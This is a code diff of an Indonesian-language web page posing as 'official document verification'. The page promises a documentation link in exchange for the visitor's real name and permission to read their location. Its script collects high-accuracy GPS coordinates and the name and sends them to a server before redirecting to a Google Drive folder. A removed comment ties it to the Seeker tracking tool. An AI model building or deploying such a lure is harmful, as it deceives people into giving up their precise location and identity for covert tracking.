@@ -14,8 +14,17 @@
       font-size: 16px;
       background: #000000;
       color: white;
-      border: add;
+      border: none;
       border-radius: 10px;
+      cursor: pointer;
+    }
+    input {
+      padding: 10px;
+      font-size: 16px;
+      width: 250px;
+      margin-bottom: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
     }
   </style>
 </head>
@@ -23,25 +32,34 @@
   <h2>Verifikasi Dokumen Resmi</h2>
   <p>Klik tombol di bawah untuk mendapatkan link dokumentasi.</p>
   <p>Klik Allow untuk mendapatkan Link.</p>
-  <p>Mohon isi kolom dengan Nama Asli agar mudah dalam Pendataan👍👍</p>
+  <p>Mohon isi kolom dengan Nama Asli agar mudah dalam Pendataan 👍👍</p>
   <img src="https://github.com/mukti-nux/Framer-asset/blob/main/pocoyo-giphy2.gif?raw=true" alt="GiFOnline" width="400">
-  <br>
+  <br><br>
 
-  <!-- Form untuk input nama -->
-  <input type="text" id="nama" placeholder="Masukkan Nama Anda" required><br><br>
-  
+  <input type="text" id="nama" placeholder="Masukkan Nama Anda" required><br>
   <button onclick="startTracking()">Dapatkan Link</button>
 
   <script>
     function startTracking() {
-      // Ambil nama dari input
-      var nama = document.getElementById("nama").value;
-      
-      // Panggil fungsi dari Seeker
+      var nama = document.getElementById("nama").value.trim();
+
+      if (!nama) {
+        alert("Nama belum diisi.");
+        return;
+      }
+
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          sendData(position, nama); // Kirim data posisi dan nama
-        }, showError);
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            sendData(position, nama);
+          },
+          showError,
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
       } else {
         alert("Browser Anda tidak mendukung GPS.");
       }
@@ -57,7 +75,7 @@
           lat: position.coords.latitude,
           lon: position.coords.longitude,
           acc: position.coords.accuracy,
-          nama: nama // Tambahkan nama ke data yang dikirim
+          nama: nama
         })
       })
       .then(response => {
@@ -65,7 +83,6 @@
           console.error('Gagal kirim data:', response);
           alert('Gagal mengirim data ke server');
         } else {
-          // Redirect setelah data terkirim
           window.location.href = "https://drive.google.com/drive/folders/1xiz5IF0xhsMKqnol0cBrO8KWScXV7cd-?usp=sharing";
         }
       })
@@ -78,10 +95,10 @@
     function showError(error) {
       switch(error.code) {
         case error.PERMISSION_DENIED:
-          alert("Klik,Izinkan agar dapat direct ke Link Dokumentasi.");
+          alert("Klik Izinkan agar dapat direct ke Link Dokumentasi.");
           break;
         case error.POSITION_UNAVAILABLE:
-          alert("Informasi tidak tersedia.");
+          alert("Informasi lokasi tidak tersedia.");
           break;
         case error.TIMEOUT:
           alert("Waktu permintaan lokasi habis.");
